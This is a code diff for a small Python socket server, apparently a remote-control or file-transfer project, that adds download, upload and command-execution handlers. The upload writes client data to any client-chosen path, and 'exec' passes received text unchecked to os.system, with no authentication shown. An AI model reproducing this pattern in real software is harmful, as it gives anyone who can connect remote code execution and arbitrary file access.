@@ -32,6 +32,7 @@ class ClientThread(threading.Thread):
         print("Connection de %s %s" % (self.ip, self.port,))
 
         while self.is_running:
+
             command = self.clientsocket.recv(2048).decode()
             if command is not '':
                 command_name, command_args = command.split(":", 1)
@@ -66,14 +67,22 @@ class ClientThread(threading.Thread):
         """ args : 0 : file name
                    1 : save path"""
 
-        fp = open(args, 'rb')
-        self.clientsocket.send(fp.read())
+        with open(os.path.join(self.current_path.absolute(), args), 'rb') as fp:
+            self.clientsocket.send(fp.read())
 
     def put(self, args):
-        pass
+        """ args : 0 : save path 
+                   1 : file in binary"""
+
+        # TODO : sauts de ligne petés
+        save_path, file = args.split(":", 1)
+        file = file.encode()
+        with open(save_path, 'wb') as f:
+            f.write(file)
 
     def exec(self, args):
-        pass
+        os.system(args)
+        # TODO : recuperer la sortie console et la renvoyer
 
     def exit(self, args):
         self.is_running = False
